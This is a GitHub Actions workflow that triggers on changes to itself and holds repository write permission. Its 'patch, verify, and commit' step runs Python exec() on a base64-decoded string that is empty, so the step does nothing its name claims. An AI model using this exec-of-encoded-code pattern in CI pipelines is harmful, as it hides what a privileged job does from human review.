name: Prepare client fixes finalizer v2

on:
  push:
    branches: [client-fixes-20260912-r1]
    paths:
      - '.github/workflows/prep-client-fixes-finalize-v2.yml'

permissions:
  contents: write

jobs:
  prepare:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: actions/setup-node@v4
        with:
          node-version-file: .node-version
          cache: npm
      - run: npm ci
      - name: Patch, verify, and commit source/test changes
        run: |
          python - <<'PY'
          import base64
          exec(base64.b64decode('').decode())
          PY
